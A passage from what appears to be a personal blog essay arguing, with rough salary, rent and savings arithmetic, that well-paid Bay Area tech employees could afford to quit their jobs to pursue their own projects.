<p>So let’s say you’re screwed and earn nothing as a founder. What’s the opportunity cost? Well in that year, it’s the full $350,000, or 100% of total compensation. But over your lifetime, the opportunity cost of taking a year off to pursue your dream is just 1 year out of a 40 year career. Around 2.5% of lifetime earnings. [3]</p>
<p>Is it not worth paying 2.5% of lifetime earnings to give your passion an earnest attempt? If you truly believed in something, would you really be unwilling to sacrifice even a miniscule fraction of all future income?</p>
<p>I’m sure this is part of the explanation, but it can’t be more than a small piece.</p>
<h3 id="Golden-Handcuffs-as-Bay-Area-Cost-of-Living"><a href="#Golden-Handcuffs-as-Bay-Area-Cost-of-Living" title="Golden Handcuffs as Bay Area Cost of Living"></a>Golden Handcuffs as Bay Area Cost of Living</h3><p><a target="_blank" rel="noopener" href="https://www.economist.com/briefing/2018/09/01/silicon-valley-is-changing-and-its-lead-over-other-tech-hubs-narrowing">Ajay Royan of Mithril Capital writes</a>:</p>
<blockquote>
<p>How are you supposed to have a startup in a garage if the garage costs millions of dollars?</p>
</blockquote>
<p>That’s a great one-liner, but it’s also garbage logic. Sure, home sale prices are in the millions, but if you just want to rent a garage, he’s off by a factor of 100.</p>
<p>Here’s a <a target="_blank" rel="noopener" href="https://sfbay.craigslist.org/search/apa?search_distance=5&amp;postal=94043&amp;availabilityMode=0&amp;housing_type=6&amp;parking=2&amp;sale_date=all+dates">CraigsList search</a> for homes in mountain view with attached garages. They seem to go for around $1,200 / bedroom. If you rent <a target="_blank" rel="noopener" href="https://www.zillow.com/homedetails/1721-Morgan-St-Mountain-View-CA-94043/19512936_zpid/">this 4br for $4,500</a> (<a target="_blank" rel="noopener" href="https://perma.cc/7C22-EU5D">perma</a>) rent is $13,500 / year, or around $16,000 in a typical pre-covid market [4].</p>
<p>That seems expensive, but again, not compared to total compensation.</p>
<p>Let’s say you work at Google for 5 years, making $190k the first two, $260k the second two, and $350 the 5th. <a target="_blank" rel="noopener" href="https://smartasset.com/taxes/california-tax-calculator#A6tBLiJGb6">Post tax</a>, that’s $793,000 in earnings. In those same 5 years, you spent $80,000 on rent, so you’re down to $713,000 in savings.</p>
<p>As discussed in the corporate perks section, Google takes care of every need you might have, so there are no other costs. [5]</p>
<p>Let’s be really conservative and say you didn’t invest any of your earnings during those 5 years. [6] And let’s continue to be conservative and say you’re using a 5% safe withdrawal rate [7] instead of living off the principal.</p>
<p>With those parameters, you are still pulling in $35,650 in passive income. More than enough to afford the $16,000 for rent, $8,000 for kombucha, granola and massages, and still have over $11,000 left over. [8]</p>
<p>Even one year at Google would net you $126k post-tax, which is $110k after rent. So at 23, you could quit your job and still have 4.5 years of runway to pursue your dreams. And you can do this while continuing to eat superfoods and living in the most expensive rental market in the world.</p>
<p>To summarize: Rising rent costs are nothing compared to corporate tech salaries. Royan’s argument that garages have gotten too expensive for startups is totally unconvincing.</p>
<h3 id="Conclusion"><a href="#Conclusion" title="Conclusion"></a>Conclusion</h3><p>If it’s not perks, pay or cost of living, what’s going on here?</p>
<p>I’ll provide my own theory in the next post, but here are some possibilities:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.givingwhatwecan.org/">You donate most of your income</a></li>
<li>You love your job more than anything you can possibly imagine doing instead</li>
<li>You engage in very strong <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Time_preference#Temporal_discounting">temporal discounting</a></li>
<li>The credentials, learning or capital from your job are a critical step to future plans</li>
</ul>
<p>If none of those excuses apply, what are you doing instead?</p>
<p>Presumably, you have some values, and those values are not maxed out. They might be hedonic (your life is not as pleasurable as it could be), altruistic (the world is not as good as it could be), or narcissistic (your status is not as high as it could be).</p>
<p>Whatever the case, day jobs seem to be the proximate cause holding you back. I realize that quitting your job won’t magically turn you into a dream-fulfilling machine, but it is probably a good first step.</p>
<p>Everyone knows this. Everyone knows that it is best to directly pursue instrinsic value instead of getting distracted by instrumental goods and side quests.</p>
<p>So again, what are you doing?</p>
<p>I’m not asking rhetorically and this isn’t a motivational essay. I genuinely want to know.</p>
<p>Seriously, email me.</p>
<hr>
<p>[1] I’m assuming 20 days of vacation, holiday, sick leave, etc.</p>
<p>[2] If you already work at FAANG, odds are probably much better. This reduces opportunity cost, and strengthens my point.</p>
<p>[3] Of course, the early earnings compound, but your salary also goes up later in life. Maybe that’s not exactly a wash, but this is all back-of-the-napkin anyway.</p>
<p>[4] <a target="_blank" rel="noopener" href="https://www.sfchronicle.com/bayarea/article/Rent-prices-drop-again-in-S-F-and-other-Bay-Area-15692584.php">https://www.sfchronicle.com/bayarea/article/Rent-prices-drop-again-in-S-F-and-other-Bay-Area-15692584.php</a></p>
<p>[5] I’m sort of kidding, but seriously, what else are you spending money on?</p>
<p>[6] For the record, the S&amp;P is up 70% in the last 5 years, or around 11% annualized.</p>
<p>[7] I know you’ve heard 4%, but 5% seems reasonable. <a target="_blank" rel="noopener" href="https://www.marketwatch.com/story/the-inventor-of-the-4-rule-just-changed-it-11603380557">MarketWatch</a>, <a target="_blank" rel="noopener" href="https://www.reddit.com/r/financialindependence/comments/jg898y/4_rule_update/">Reddit</a>.</p>
<p>[8] To be clear, this is not a financial independence blog. It seems great in theory, but given how many people seem to struggle with fulfillment afterwards, I can’t strongly recommend it. I’m not against it either, but I’d like to figure out what’s going before I start giving life advice.</p>
